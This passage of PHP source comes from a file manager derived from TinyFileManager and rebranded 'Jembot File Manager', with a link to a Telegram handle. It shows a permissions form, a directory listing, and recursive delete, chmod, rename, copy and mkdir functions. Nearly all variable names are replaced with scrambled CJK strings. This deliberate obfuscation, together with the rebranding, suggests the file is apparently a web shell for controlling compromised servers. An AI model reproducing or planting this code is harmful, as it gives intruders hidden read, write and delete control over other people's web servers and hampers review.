        fm_redirect(FM_SELF_URL . '?p=' . urlencode($偊沣銇傘堛墎愀亪垇伎));
    }

    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path

    $笺紒併妶康銐亖併沣矇 = FM_ROOT_URL . (FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $慊銇愕仚剚亗焷獋亖銇;
    $粊銇堛粊畟沣硷併亖 = $妶慵銇偛沣垇锛笺劜珓 . '/' . $慊銇愕仚剚亗焷獋亖銇;

    $寛侊患喐伎獊崄亖亖銐 = fileperms($妶慵銇偛沣垇锛笺劜珓 . '/' . $慊銇愕仚剚亗焷獋亖銇);
?>
    <div class="path">
        <div class="card mb-2" data-bs-theme="<?php 
echo FM_THEME; ?>">
            <h6 class="card-header">
                <?php 
echo lng('ChangePermissions') ?>
            </h6>
            <div class="card-body">
                <p class="card-text">
                    <?php 
$夈併銞伈傘亖搹銊侊亗 = fm_get_display_path($粊銇堛粊畟沣硷併亖); ?>
                    <?php 
echo $夈併銞伈傘亖搹銊侊亗['label']; ?>: <?php 
echo $夈併銞伈傘亖搹銊侊亗['path']; ?><br>
                </p>
                <form action="" method="post">
                    <input type="hidden" name="p" value="<?php 
echo fm_enc(FM_PATH) ?>">
                    <input type="hidden" name="chmod" value="<?php 
echo fm_enc($慊銇愕仚剚亗焷獋亖銇) ?>">

                    <table class="table compact-table" data-bs-theme="<?php 
echo FM_THEME; ?>">
                        <tr>
                            <td></td>
                            <td><b><?php 
echo lng('Owner') ?></b></td>
                            <td><b><?php 
echo lng('Group') ?></b></td>
                            <td><b><?php 
echo lng('Other') ?></b></td>
                        </tr>
                        <tr>
                            <td style="text-align: right"><b><?php 
echo lng('Read') ?></b></td>
                            <td><label><input type="checkbox" name="ur" value="1" <?php 
echo ($寛侊患喐伎獊崄亖亖銐 & 00400) ? ' checked' : '' ?>></label></td>
                            <td><label><input type="checkbox" name="gr" value="1" <?php 
echo ($寛侊患喐伎獊崄亖亖銐 & 00040) ? ' checked' : '' ?>></label></td>
                            <td><label><input type="checkbox" name="or" value="1" <?php 
echo ($寛侊患喐伎獊崄亖亖銐 & 00004) ? ' checked' : '' ?>></label></td>
                        </tr>
                        <tr>
                            <td style="text-align: right"><b><?php 
echo lng('Write') ?></b></td>
                            <td><label><input type="checkbox" name="uw" value="1" <?php 
echo ($寛侊患喐伎獊崄亖亖銐 & 00200) ? ' checked' : '' ?>></label></td>
                            <td><label><input type="checkbox" name="gw" value="1" <?php 
echo ($寛侊患喐伎獊崄亖亖銐 & 00020) ? ' checked' : '' ?>></label></td>
                            <td><label><input type="checkbox" name="ow" value="1" <?php 
echo ($寛侊患喐伎獊崄亖亖銐 & 00002) ? ' checked' : '' ?>></label></td>
                        </tr>
                        <tr>
                            <td style="text-align: right"><b><?php 
echo lng('Execute') ?></b></td>
                            <td><label><input type="checkbox" name="ux" value="1" <?php 
echo ($寛侊患喐伎獊崄亖亖銐 & 00100) ? ' checked' : '' ?>></label></td>
                            <td><label><input type="checkbox" name="gx" value="1" <?php 
echo ($寛侊患喐伎獊崄亖亖銐 & 00010) ? ' checked' : '' ?>></label></td>
                            <td><label><input type="checkbox" name="ox" value="1" <?php 
echo ($寛侊患喐伎獊崄亖亖銐 & 00001) ? ' checked' : '' ?>></label></td>
                        </tr>
                    </table>

                    <p>
                        <input type="hidden" name="token" value="<?php 
echo $_SESSION['token']; ?>">
                        <b><a href="?p=<?php 
echo urlencode(FM_PATH) ?>" class="btn btn-outline-primary"><i class="fa fa-times-circle"></i> <?php 
echo lng('Cancel') ?></a></b>&nbsp;
                        <button type="submit" class="btn btn-success"><i class="fa fa-check-circle"></i> <?php 
echo lng('Change') ?></button>
                    </p>
                </form>
            </div>
        </div>
    </div>
<?php

    fm_show_footer();
    exit;
}

// --- TINYFILEMANAGER MAIN ---
fm_show_header(); // HEADER
fm_show_nav_path(FM_PATH); // current path

// show alert messages
fm_show_message();

$飦沣銇紒娂惘勩沣亗沣 = count($飩併伡併銖慊傘壖銇亗);
$併粺勩銇唩镢併傘倎 = count($銚銑竵銇垇銦亖勩傘锃);
$倓銇銇技剚亖伡銈笺偢 = 0;
?>
<form action="" method="post" class="pt-3">
    <input type="hidden" name="p" value="<?php 
echo fm_enc(FM_PATH) ?>">
    <input type="hidden" name="group" value="1">
    <input type="hidden" name="token" value="<?php 
echo $_SESSION['token']; ?>">
    <div class="table-responsive">
        <table class="table table-bordered table-hover table-sm" id="main-table" data-bs-theme="<?php 
echo FM_THEME; ?>">
            <thead class="thead-white">
                <tr>
                    <?php 
if (!FM_READONLY): ?>
                        <th style="width:3%" class="custom-checkbox-header">
                            <div class="custom-control custom-checkbox">
                                <input type="checkbox" class="custom-control-input" id="js-select-all-items" onclick="checkbox_toggle()">
                                <label class="custom-control-label" for="js-select-all-items"></label>
                            </div>
                        </th><?php 
endif; ?>
                    <th><?php 
echo lng('Name') ?></th>
                    <th><?php 
echo lng('Size') ?></th>
                    <th><?php 
echo lng('Modified') ?></th>
                    <?php 
if (!FM_IS_WIN && !$笺泔搫銇埐慵嗐嗐沣併): ?>
                        <th><?php 
echo lng('Perms') ?></th>
                        <th><?php 
echo lng('Owner') ?></th><?php 
endif; ?>
                    <th><?php 
echo lng('Actions') ?></th>
                </tr>
            </thead>
            <?php

            // link to parent folder
            if ($銌偀亖亰慵併銇併銇 !== false) {
            ?>
                <tr><?php 
if (!FM_READONLY): ?>
                        <td class="nosort"></td><?php 
endif; ?>
                    <td class="border-0" data-sort><a href="?p=<?php 
echo urlencode($銌偀亖亰慵併銇併銇) ?>"><i class="fa fa-chevron-circle-left go-back"></i> ..</a></td>
                    <td class="border-0" data-order></td>
                    <td class="border-0" data-order></td>
                    <td class="border-0"></td>
                    <?php 
if (!FM_IS_WIN && !$笺泔搫銇埐慵嗐嗐沣併) { ?>
                        <td class="border-0"></td>
                        <td class="border-0"></td>
                    <?php 
} ?>
                </tr>
            <?php

            }
            $倐銒亯銏潑亖亴搧镢镢 = 3399;
            foreach ($銚銑竵銇垇銦亖勩傘锃 as $镢傘銇点镢亖镢垇笺粡) {
                $珎剚伈晧銇亰搱傘亪沣 = is_link($妶慵銇偛沣垇锛笺劜珓 . '/' . $镢傘銇点镢亖镢垇笺粡);
                $亪併亖劃伈妬獊层亗銊 = $珎剚伈晧銇亰搱傘亪沣 ? 'icon-link_folder' : 'fa fa-folder-o';
                $倎併銈亴銠銤伝沣銏銊 = filemtime($妶慵銇偛沣垇锛笺劜珓 . '/' . $镢傘銇点镢亖镢垇笺粡);
                $夈銈亖裤仚搏亖飱粏併 = date(FM_DATETIME_FORMAT, $倎併銈亴銠銤伝沣銏銊);
                $娂唩併墎増銇濓銇沣Σ = strtotime(date("F d Y H:i:s.", $倎併銈亴銠銤伝沣銏銊));
                $堛銇亖技堛亪偢偧埧 = "";
                $銇亰伡剟慊銐垈泔銐緣 = lng('Folder');
                $唩潅沣悴増愀併銏憔悴 = substr(decoct(fileperms($妶慵銇偛沣垇锛笺劜珓 . '/' . $镢傘銇点镢亖镢垇笺粡)), -4);
                if (function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) {
                    $縼亖瞾銦伒寕亖銇傘銇 = posix_getpwuid(fileowner($妶慵銇偛沣垇锛笺劜珓 . '/' . $镢傘銇点镢亖镢垇笺粡));
                    $撱慵沣沣沣銏剚亖銊亪 = posix_getgrgid(filegroup($妶慵銇偛沣垇锛笺劜珓 . '/' . $镢傘銇点镢亖镢垇笺粡));
                    if ($縼亖瞾銦伒寕亖銇傘銇 === false) {
                        $縼亖瞾銦伒寕亖銇傘銇 = array('name' => '?');
                    }
                    if ($撱慵沣沣沣銏剚亖銊亪 === false) {
                        $撱慵沣沣沣銏剚亖銊亪 = array('name' => '?');
                    }
                } else {
                    $縼亖瞾銦伒寕亖銇傘銇 = array('name' => '?');
                    $撱慵沣沣沣銏剚亖銊亪 = array('name' => '?');
                }
            ?>
                <tr>
                    <?php 
if (!FM_READONLY): ?>
                        <td class="custom-checkbox-td">
                            <div class="custom-control custom-checkbox">
                                <input type="checkbox" class="custom-control-input" id="<?php 
echo $倐銒亯銏潑亖亴搧镢镢 ?>" name="file[]" value="<?php 
echo fm_enc($镢傘銇点镢亖镢垇笺粡) ?>">
                                <label class="custom-control-label" for="<?php 
echo $倐銒亯銏潑亖亴搧镢镢 ?>"></label>
                            </div>
                        </td>
                    <?php 
endif; ?>
                    <td data-sort=<?php 
echo fm_convert_win(fm_enc($镢傘銇点镢亖镢垇笺粡)) ?>>
                        <div class="filename">
                            <a href="?p=<?php 
echo urlencode(trim(FM_PATH . '/' . $镢傘銇点镢亖镢垇笺粡, '/')) ?>"><i class="<?php 
echo $亪併亖劃伈妬獊层亗銊 ?>"></i> <?php 
echo fm_convert_win(fm_enc($镢傘銇点镢亖镢垇笺粡)) ?></a>
                            <?php 
echo ($珎剚伈晧銇亰搱傘亪沣 ? ' &rarr; <i>' . readlink($妶慵銇偛沣垇锛笺劜珓 . '/' . $镢傘銇点镢亖镢垇笺粡) . '</i>' : '') ?>
                        </div>
                    </td>
                    <td data-order="a-<?php 
echo str_pad($堛銇亖技堛亪偢偧埧, 18, "0", STR_PAD_LEFT); ?>">
                        <?php 
echo $銇亰伡剟慊銐垈泔銐緣; ?>
                    </td>
                    <td data-order="a-<?php 
echo $娂唩併墎増銇濓銇沣Σ; ?>"><?php 
echo $夈銈亖裤仚搏亖飱粏併 ?></td>
                    <?php 
if (!FM_IS_WIN && !$笺泔搫銇埐慵嗐嗐沣併): ?>
                        <td>
                            <?php 
if (!FM_READONLY): ?><a title="Change Permissions" href="?p=<?php 
echo urlencode(FM_PATH) ?>&amp;chmod=<?php 
echo urlencode($镢傘銇点镢亖镢垇笺粡) ?>"><?php 
echo $唩潅沣悴増愀併銏憔悴 ?></a><?php 
else: ?><?php 
echo $唩潅沣悴増愀併銏憔悴 ?><?php 
endif; ?>
                        </td>
                        <td>
                            <?php 
echo $縼亖瞾銦伒寕亖銇傘銇['name'] . ':' . $撱慵沣沣沣銏剚亖銊亪['name'] ?>
                        </td>
                    <?php 
endif; ?>
                    <td class="inline-actions"><?php 
if (!FM_READONLY): ?>
                            <a title="<?php 
echo lng('Delete') ?>" href="?p=<?php 
echo urlencode(FM_PATH) ?>&amp;del=<?php 
echo urlencode($镢傘銇点镢亖镢垇笺粡) ?>" onclick="confirmDailog(event, '1028','<?php 
echo lng('Delete') . ' ' . lng('Folder'); ?>','<?php 
echo urlencode($镢傘銇点镢亖镢垇笺粡) ?>', this.href);"> <i class="fa fa-trash-o" aria-hidden="true"></i></a>
                            <a title="<?php 
echo lng('Rename') ?>" href="#" onclick="rename('<?php 
echo fm_enc(addslashes(FM_PATH)) ?>', '<?php 
echo fm_enc(addslashes($镢傘銇点镢亖镢垇笺粡)) ?>');return false;"><i class="fa fa-pencil-square-o" aria-hidden="true"></i></a>
                            <a title="<?php 
echo lng('CopyTo') ?>..." href="?p=&amp;copy=<?php 
echo urlencode(trim(FM_PATH . '/' . $镢傘銇点镢亖镢垇笺粡, '/')) ?>"><i class="fa fa-files-o" aria-hidden="true"></i></a>
                        <?php 
endif; ?>
                        <a title="<?php 
echo lng('DirectLink') ?>" href="<?php 
echo fm_enc(FM_ROOT_URL . (FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $镢傘銇点镢亖镢垇笺粡 . '/') ?>" target="_blank"><i class="fa fa-link" aria-hidden="true"></i></a>
                    </td>
                </tr>
            <?php

                flush();
                $倐銒亯銏潑亖亴搧镢镢++;
            }
            $併锏併銒紒銇櫦屻亯亪 = 8002;
            foreach ($飩併伡併銖慊傘壖銇亗 as $镢傘銇点镢亖镢垇笺粡) {
                $珎剚伈晧銇亰搱傘亪沣 = is_link($妶慵銇偛沣垇锛笺劜珓 . '/' . $镢傘銇点镢亖镢垇笺粡);
                $亪併亖劃伈妬獊层亗銊 = $珎剚伈晧銇亰搱傘亪沣 ? 'fa fa-file-text-o' : fm_get_file_icon_class($妶慵銇偛沣垇锛笺劜珓 . '/' . $镢傘銇点镢亖镢垇笺粡);
                $倎併銈亴銠銤伝沣銏銊 = filemtime($妶慵銇偛沣垇锛笺劜珓 . '/' . $镢傘銇点镢亖镢垇笺粡);
                $夈銈亖裤仚搏亖飱粏併 = date(FM_DATETIME_FORMAT, $倎併銈亴銠銤伝沣銏銊);
                $娂唩併墎増銇濓銇沣Σ = strtotime(date("F d Y H:i:s.", $倎併銈亴銠銤伝沣銏銊));
                $堛銇亖技堛亪偢偧埧 = fm_get_size($妶慵銇偛沣垇锛笺劜珓 . '/' . $镢傘銇点镢亖镢垇笺粡);
                $銇亰伡剟慊銐垈泔銐緣 = fm_get_filesize($堛銇亖技堛亪偢偧埧);
                $銇併镢傘矔墎沣亖泔 = '?p=' . urlencode(FM_PATH) . '&amp;view=' . urlencode($镢傘銇点镢亖镢垇笺粡);
                $倓銇銇技剚亖伡銈笺偢 += $堛銇亖技堛亪偢偧埧;
                $唩潅沣悴増愀併銏憔悴 = substr(decoct(fileperms($妶慵銇偛沣垇锛笺劜珓 . '/' . $镢傘銇点镢亖镢垇笺粡)), -4);
                if (function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) {
                    $縼亖瞾銦伒寕亖銇傘銇 = posix_getpwuid(fileowner($妶慵銇偛沣垇锛笺劜珓 . '/' . $镢傘銇点镢亖镢垇笺粡));
                    $撱慵沣沣沣銏剚亖銊亪 = posix_getgrgid(filegroup($妶慵銇偛沣垇锛笺劜珓 . '/' . $镢傘銇点镢亖镢垇笺粡));
                    if ($縼亖瞾銦伒寕亖銇傘銇 === false) {
                        $縼亖瞾銦伒寕亖銇傘銇 = array('name' => '?');
                    }
                    if ($撱慵沣沣沣銏剚亖銊亪 === false) {
                        $撱慵沣沣沣銏剚亖銊亪 = array('name' => '?');
                    }
                } else {
                    $縼亖瞾銦伒寕亖銇傘銇 = array('name' => '?');
                    $撱慵沣沣沣銏剚亖銊亪 = array('name' => '?');
                }
            ?>
                <tr>
                    <?php 
if (!FM_READONLY): ?>
                        <td class="custom-checkbox-td">
                            <div class="custom-control custom-checkbox">
                                <input type="checkbox" class="custom-control-input" id="<?php 
echo $併锏併銒紒銇櫦屻亯亪 ?>" name="file[]" value="<?php 
echo fm_enc($镢傘銇点镢亖镢垇笺粡) ?>">
                                <label class="custom-control-label" for="<?php 
echo $併锏併銒紒銇櫦屻亯亪 ?>"></label>
                            </div>
                        </td><?php 
endif; ?>
                    <td data-sort=<?php 
echo fm_enc($镢傘銇点镢亖镢垇笺粡) ?>>
                        <div class="filename">
                            <?php

                            if (in_array(strtolower(pathinfo($镢傘銇点镢亖镢垇笺粡, PATHINFO_EXTENSION)), array('gif', 'jpg', 'jpeg', 'png', 'bmp', 'ico', 'svg', 'webp', 'avif'))): ?>
                                <?php 
$銈笺亖慵亖铼飰汇沣伀 = fm_enc(FM_ROOT_URL . (FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $镢傘銇点镢亖镢垇笺粡); ?>
                                <a href="<?php 
echo $銇併镢傘矔墎沣亖泔 ?>" data-preview-image="<?php 
echo $銈笺亖慵亖铼飰汇沣伀 ?>" title="<?php 
echo fm_enc($镢傘銇点镢亖镢垇笺粡) ?>">
                                <?php 
else: ?>
                                    <a href="<?php 
echo $銇併镢傘矔墎沣亖泔 ?>" title="<?php 
echo $镢傘銇点镢亖镢垇笺粡 ?>">
                                    <?php 
endif; ?>
                                    <i class="<?php 
echo $亪併亖劃伈妬獊层亗銊 ?>"></i> <?php 
echo fm_convert_win(fm_enc($镢傘銇点镢亖镢垇笺粡)) ?>
                                    </a>
                                    <?php 
echo ($珎剚伈晧銇亰搱傘亪沣 ? ' &rarr; <i>' . readlink($妶慵銇偛沣垇锛笺劜珓 . '/' . $镢傘銇点镢亖镢垇笺粡) . '</i>' : '') ?>
                        </div>
                    </td>
                    <td data-order="b-<?php 
echo str_pad($堛銇亖技堛亪偢偧埧, 18, "0", STR_PAD_LEFT); ?>"><span title="<?php 
printf('%s bytes', $堛銇亖技堛亪偢偧埧) ?>">
                            <?php 
echo $銇亰伡剟慊銐垈泔銐緣; ?>
                        </span></td>
                    <td data-order="b-<?php 
echo $娂唩併墎増銇濓銇沣Σ; ?>"><?php 
echo $夈銈亖裤仚搏亖飱粏併 ?></td>
                    <?php 
if (!FM_IS_WIN && !$笺泔搫銇埐慵嗐嗐沣併): ?>
                        <td><?php 
if (!FM_READONLY): ?><a title="<?php 
echo 'Change Permissions' ?>" href="?p=<?php 
echo urlencode(FM_PATH) ?>&amp;chmod=<?php 
echo urlencode($镢傘銇点镢亖镢垇笺粡) ?>"><?php 
echo $唩潅沣悴増愀併銏憔悴 ?></a><?php 
else: ?><?php 
echo $唩潅沣悴増愀併銏憔悴 ?><?php 
endif; ?>
                        </td>
                        <td><?php 
echo fm_enc($縼亖瞾銦伒寕亖銇傘銇['name'] . ':' . $撱慵沣沣沣銏剚亖銊亪['name']) ?></td>
                    <?php 
endif; ?>
                    <td class="inline-actions">
                        <?php 
if (!FM_READONLY): ?>
                            <a title="<?php 
echo lng('Delete') ?>" href="?p=<?php 
echo urlencode(FM_PATH) ?>&amp;del=<?php 
echo urlencode($镢傘銇点镢亖镢垇笺粡) ?>" onclick="confirmDailog(event, 1209, '<?php 
echo lng('Delete') . ' ' . lng('File'); ?>','<?php 
echo urlencode($镢傘銇点镢亖镢垇笺粡); ?>', this.href);"> <i class="fa fa-trash-o"></i></a>
                            <a title="<?php 
echo lng('Rename') ?>" href="#" onclick="rename('<?php 
echo fm_enc(addslashes(FM_PATH)) ?>', '<?php 
echo fm_enc(addslashes($镢傘銇点镢亖镢垇笺粡)) ?>');return false;"><i class="fa fa-pencil-square-o"></i></a>
                            <a title="<?php 
echo lng('CopyTo') ?>..."
                                href="?p=<?php 
echo urlencode(FM_PATH) ?>&amp;copy=<?php 
echo urlencode(trim(FM_PATH . '/' . $镢傘銇点镢亖镢垇笺粡, '/')) ?>"><i class="fa fa-files-o"></i></a>
                        <?php 
endif; ?>
                        <a title="<?php 
echo lng('DirectLink') ?>" href="<?php 
echo fm_enc(FM_ROOT_URL . (FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $镢傘銇点镢亖镢垇笺粡) ?>" target="_blank"><i class="fa fa-link"></i></a>
                        <a title="<?php 
echo lng('Download') ?>" href="?p=<?php 
echo urlencode(FM_PATH) ?>&amp;dl=<?php 
echo urlencode($镢傘銇点镢亖镢垇笺粡) ?>" onclick="confirmDailog(event, 1211, '<?php 
echo lng('Download'); ?>','<?php 
echo urlencode($镢傘銇点镢亖镢垇笺粡); ?>', this.href);"><i class="fa fa-download"></i></a>
                    </td>
                </tr>
            <?php

                flush();
                $併锏併銒紒銇櫦屻亯亪++;
            }

            if (empty($銚銑竵銇垇銦亖勩傘锃) && empty($飩併伡併銖慊傘壖銇亗)) { ?>
                <tfoot>
                    <tr><?php 
if (!FM_READONLY): ?>
                            <td></td><?php 
endif; ?>
                        <td colspan="<?php 
echo (!FM_IS_WIN && !$笺泔搫銇埐慵嗐嗐沣併) ? '6' : '4' ?>"><em><?php 
echo lng('Folder is empty') ?></em></td>
                    </tr>
                </tfoot>
            <?php

            } else { ?>
                <tfoot>
                    <tr>
                        <td class="gray fs-7" colspan="<?php 
echo (!FM_IS_WIN && !$笺泔搫銇埐慵嗐嗐沣併) ? (FM_READONLY ? '6' : '7') : (FM_READONLY ? '4' : '5') ?>">
                            <?php 
echo lng('FullSize') . ': <span class="badge text-bg-light border-radius-0">' . fm_get_filesize($倓銇銇技剚亖伡銈笺偢) . '</span>' ?>
                            <?php 
echo lng('File') . ': <span class="badge text-bg-light border-radius-0">' . $飦沣銇紒娂惘勩沣亗沣 . '</span>' ?>
                            <?php 
echo lng('Folder') . ': <span class="badge text-bg-light border-radius-0">' . $併粺勩銇唩镢併傘倎 . '</span>' ?>
                        </td>
                    </tr>
                </tfoot>
            <?php 
} ?>
        </table>
    </div>

    <div class="row">
        <?php 
if (!FM_READONLY): ?>
            <div class="col-xs-12 col-sm-9">
                <div class="btn-group flex-wrap" data-toggle="buttons" role="toolbar">
                    <a href="#/select-all" class="btn btn-small btn-outline-primary btn-2" onclick="select_all();return false;"><i class="fa fa-check-square"></i> <?php 
echo lng('SelectAll') ?> </a>
                    <a href="#/unselect-all" class="btn btn-small btn-outline-primary btn-2" onclick="unselect_all();return false;"><i class="fa fa-window-close"></i> <?php 
echo lng('UnSelectAll') ?> </a>
                    <a href="#/invert-all" class="btn btn-small btn-outline-primary btn-2" onclick="invert_all();return false;"><i class="fa fa-th-list"></i> <?php 
echo lng('InvertSelection') ?> </a>
                    <input type="submit" class="hidden" name="delete" id="a-delete" value="Delete" onclick="return confirm('<?php 
echo lng('Delete selected files and folders?'); ?>')">
                    <a href="javascript:document.getElementById('a-delete').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-trash"></i> <?php 
echo lng('Delete') ?> </a>
                    <input type="submit" class="hidden" name="zip" id="a-zip" value="zip" onclick="return confirm('<?php 
echo lng('Create archive?'); ?>')">
                    <a href="javascript:document.getElementById('a-zip').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-file-archive-o"></i> <?php 
echo lng('Zip') ?> </a>
                    <input type="submit" class="hidden" name="tar" id="a-tar" value="tar" onclick="return confirm('<?php 
echo lng('Create archive?'); ?>')">
                    <a href="javascript:document.getElementById('a-tar').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-file-archive-o"></i> <?php 
echo lng('Tar') ?> </a>
                    <input type="submit" class="hidden" name="copy" id="a-copy" value="Copy">
                    <a href="javascript:document.getElementById('a-copy').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-files-o"></i> <?php 
echo lng('Copy') ?> </a>
                </div>
            </div>
            <div class="col-3 d-none d-sm-block"><a href="https://tinyfilemanager.github.io" target="_blank" class="float-right text-muted">jembot File Manager <?php 
echo VERSION; ?></a></div>
        <?php 
else: ?>
            <div class="col-12"><a href="https://t.me/ISC2k17" target="_blank" class="float-right text-muted">Jembot File Manager <?php 
echo VERSION; ?></a></div>
        <?php 
endif; ?>
    </div>
</form>

<?php

fm_show_footer();

// --- END HTML ---

// Functions

/**
 * It prints the css/js files into html
 * @param key The key of the external file to print.
 */
function print_external($沣几紬镢紓銇亶銐銇)
{
    global $焷伈亰搞汇亖併镢裤亖;

    if (!array_key_exists($沣几紬镢紓銇亶銐銇, $焷伈亰搞汇亖併镢裤亖)) {
        // throw new Exception('Key missing in external: ' . key);
        echo "<!-- EXTERNAL: MISSING KEY $沣几紬镢紓銇亶銐銇 -->";
        return;
    }

    echo "$焷伈亰搞汇亖併镢裤亖[$沣几紬镢紓銇亶銐銇]";
}

/**
 * Verify CSRF TOKEN and remove after certified
 * @param string $token
 * @return bool
 */
function verifyToken($亗亗沣夈併銇倐侊倳銖)
{
    if (hash_equals($_SESSION['token'], $亗亗沣夈併銇倐侊倳銖)) {
        return true;
    }
    return false;
}

/**
 * Delete  file or folder (recursively)
 * @param string $path
 * @return bool
 */
function fm_rdelete($妶慵銇偛沣垇锛笺劜珓)
{
    if (is_link($妶慵銇偛沣垇锛笺劜珓)) {
        return unlink($妶慵銇偛沣垇锛笺劜珓);
    } elseif (is_dir($妶慵銇偛沣垇锛笺劜珓)) {
        $沣倱亯併倓倎檨併悛裤 = scandir($妶慵銇偛沣垇锛笺劜珓);
        $沣镢繄夈併化硷亗泔劶 = true;
        if (is_array($沣倱亯併倓倎檨併悛裤)) {
            foreach ($沣倱亯併倓倎檨併悛裤 as $慊銇愕仚剚亗焷獋亖銇) {
                if ($慊銇愕仚剚亗焷獋亖銇 != '.' && $慊銇愕仚剚亗焷獋亖銇 != '..') {
                    if (!fm_rdelete($妶慵銇偛沣垇锛笺劜珓 . '/' . $慊銇愕仚剚亗焷獋亖銇)) {
                        $沣镢繄夈併化硷亗泔劶 = false;
                    }
                }
            }
        }
        return ($沣镢繄夈併化硷亗泔劶) ? rmdir($妶慵銇偛沣垇锛笺劜珓) : false;
    } elseif (is_file($妶慵銇偛沣垇锛笺劜珓)) {
        return unlink($妶慵銇偛沣垇锛笺劜珓);
    }
    return false;
}

/**
 * Recursive chmod
 * @param string $path
 * @param int $filemode
 * @param int $dirmode
 * @return bool
 * @todo Will use in mass chmod
 */
function fm_rchmod($妶慵銇偛沣垇锛笺劜珓, $併沣畞镢硷瘉併壖銇亖, $併傘惘堛銇摽层縼曘匡)
{
    if (is_dir($妶慵銇偛沣垇锛笺劜珓)) {
        if (!chmod($妶慵銇偛沣垇锛笺劜珓, $併傘惘堛銇摽层縼曘匡)) {
            return false;
        }
        $沣倱亯併倓倎檨併悛裤 = scandir($妶慵銇偛沣垇锛笺劜珓);
        if (is_array($沣倱亯併倓倎檨併悛裤)) {
            foreach ($沣倱亯併倓倎檨併悛裤 as $慊銇愕仚剚亗焷獋亖銇) {
                if ($慊銇愕仚剚亗焷獋亖銇 != '.' && $慊銇愕仚剚亗焷獋亖銇 != '..') {
                    if (!fm_rchmod($妶慵銇偛沣垇锛笺劜珓 . '/' . $慊銇愕仚剚亗焷獋亖銇, $併沣畞镢硷瘉併壖銇亖, $併傘惘堛銇摽层縼曘匡)) {
                        return false;
                    }
                }
            }
        }
        return true;
    } elseif (is_link($妶慵銇偛沣垇锛笺劜珓)) {
        return true;
    } elseif (is_file($妶慵銇偛沣垇锛笺劜珓)) {
        return chmod($妶慵銇偛沣垇锛笺劜珓, $併沣畞镢硷瘉併壖銇亖);
    }
    return false;
}

/**
 * Check the file extension which is allowed or not
 * @param string $filename
 * @return bool
 */
function fm_is_valid_ext($愕紕沣泔併矒倎墎患伡)
{
    $銈餀傦憧銇镢泔併搷銏 = (FM_FILE_EXTENSION) ? explode(',', FM_FILE_EXTENSION) : false;

    $沣銈倐娿珎併墎壖併飦 = pathinfo($愕紕沣泔併矒倎墎患伡, PATHINFO_EXTENSION);
    $飦曘亖泔慵銇妬沣沣傦 = ($銈餀傦憧銇镢泔併搷銏) ? in_array($沣銈倐娿珎併墎壖併飦, $銈餀傦憧銇镢泔併搷銏) : true;

    return ($飦曘亖泔慵銇妬沣沣傦) ? true : false;
}

/**
 * Safely rename
 * @param string $old
 * @param string $new
 * @return bool|null
 */
function fm_rename($惘紒沣弬亖珦檨Φ焿沣, $亖剛亪銇緜銓偧併悴堛)
{
    $飦曘亖泔慵銇妬沣沣傦 = fm_is_valid_ext($亖剛亪銇緜銓偧併悴堛);

    if (!is_dir($惘紒沣弬亖珦檨Φ焿沣)) {
        if (!$飦曘亖泔慵銇妬沣沣傦) return false;
    }

    return (!file_exists($亖剛亪銇緜銓偧併悴堛) && file_exists($惘紒沣弬亖珦檨Φ焿沣)) ? rename($惘紒沣弬亖珦檨Φ焿沣, $亖剛亪銇緜銓偧併悴堛) : null;
}

/**
 * Copy file or folder (recursively).
 * @param string $path
 * @param string $dest
 * @param bool $upd Update files
 * @param bool $force Create folder with same names instead file
 * @return bool
 */
function fm_rcopy($妶慵銇偛沣垇锛笺劜珓, $换慵偀唩布銈伅埦侊併, $亞喚銇沣飦笂亖倐銇 = true, $沣併銇墕亖銖亜妬亗梻 = true)
{
    if (!is_dir($妶慵銇偛沣垇锛笺劜珓) && !is_file($妶慵銇偛沣垇锛笺劜珓)) {
        return false;
    }

    if (is_dir($妶慵銇偛沣垇锛笺劜珓)) {
        if (!fm_mkdir($换慵偀唩布銈伅埦侊併, $沣併銇墕亖銖亜妬亗梻)) {
            return false;
        }

        $沣倱亯併倓倎檨併悛裤 = array_diff(scandir($妶慵銇偛沣垇锛笺劜珓), ['.', '..']);

        foreach ($沣倱亯併倓倎檨併悛裤 as $慊銇愕仚剚亗焷獋亖銇) {
            if (!fm_rcopy("$妶慵銇偛沣垇锛笺劜珓/$慊銇愕仚剚亗焷獋亖銇", "$换慵偀唩布銈伅埦侊併/$慊銇愕仚剚亗焷獋亖銇", $亞喚銇沣飦笂亖倐銇, $沣併銇墕亖銖亜妬亗梻)) {
                return false;
            }
        }

        return true;
    }

    // Handle file copying
    return fm_copy($妶慵銇偛沣垇锛笺劜珓, $换慵偀唩布銈伅埦侊併, $亞喚銇沣飦笂亖倐銇);
}


/**
 * Safely create folder
 * @param string $dir
 * @param bool $force
 * @return bool
 */
function fm_mkdir($沣亖嫮併夈沣併紒汇銐, $沣併銇墕亖銖亜妬亗梻)
{
    if (file_exists($沣亖嫮併夈沣併紒汇銐)) {
        if (is_dir($沣亖嫮併夈沣併紒汇銐)) {
            return $沣亖嫮併夈沣併紒汇銐;
        } elseif (!$沣併銇墕亖銖亜妬亗梻) {
            return false;
        }
        unlink($沣亖嫮併夈沣併紒汇銐);
    }
    return mkdir($沣亖嫮併夈沣併紒汇銐, 0777, true);
}

/**
 * Safely copy file
 * @param string $f1
 * @param string $f2
 * @param bool $upd Indicates if file should be updated with new content
 * @return bool
 */
function fm_copy($棘笺沣檨勩沣銈沣憧飦, $併仚寕併銇畧沣勶紗傘, $亞喚銇沣飦笂亖倐銇)
{
    $棄亪紒銈併慊仚焷沣倎 = filemtime($棘笺沣檨勩沣銈沣憧飦);
    if (file_exists($併仚寕併銇畧沣勶紗傘)) {
        $锊併泔粰锊倎亪銜飦 = filemtime($併仚寕併銇畧沣勶紗傘);
        if ($锊併泔粰锊倎亪銜飦 >= $棄亪紒銈併慊仚焷沣倎 && $亞喚銇沣飦笂亖倐銇) {
            return false;
        }
    }
    $沣镢繄夈併化硷亗泔劶 = copy($棘笺沣檨勩沣銈沣憧飦, $併仚寕併銇畧沣勶紗傘);
    if ($沣镢繄夈併化硷亗泔劶) {
        touch($併仚寕併銇畧沣勶紗傘, $棄亪紒銈併慊仚焷沣倎);
    }
    return $沣镢繄夈併化硷亗泔劶;
}

/**
